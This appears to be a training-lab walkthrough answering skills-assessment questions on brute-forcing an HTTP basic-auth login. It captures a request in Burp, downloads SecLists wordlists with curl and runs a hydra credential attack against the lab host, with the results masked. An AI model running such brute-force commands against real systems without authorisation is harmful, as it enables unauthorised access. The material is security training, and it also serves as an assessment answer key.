
# Brief

The first part of the skills assessment will require you to brute-force the the target instance. 

Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)


# Questions

1. What is the password for the basic auth login?

```sh
# Target:
94.237.50.221:52525

# Access the target
http://94.237.50.221:52525


# Observe you are required a username and password. Enter test:test to capture the request in Burp.
GET / HTTP/1.1
Host: 94.237.50.221:52525
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
Authorization: Basic dGVzdDp0ZXN0


# B64 decode the authorization to see it's your test:test. Failure message
401 Authorization Required


# Download the wordlists
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt


# Format
mv 2023-200_most_used_passwords.txt passwords.txt

mv top-usernames-shortlist.txt usernames.txt


# Attack
hydra -L usernames.txt -P passwords.txt 94.237.50.221 http-get / -s 52525

...
[52525][http-get] host: 94.237.50.221   login: ******   password: ******
...


# Verify credentials
******:******
```


2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

```sh
# and once successful, read the message
Congratulations!

This is the username you will need for part 2 of the Skills Assessment ******
```
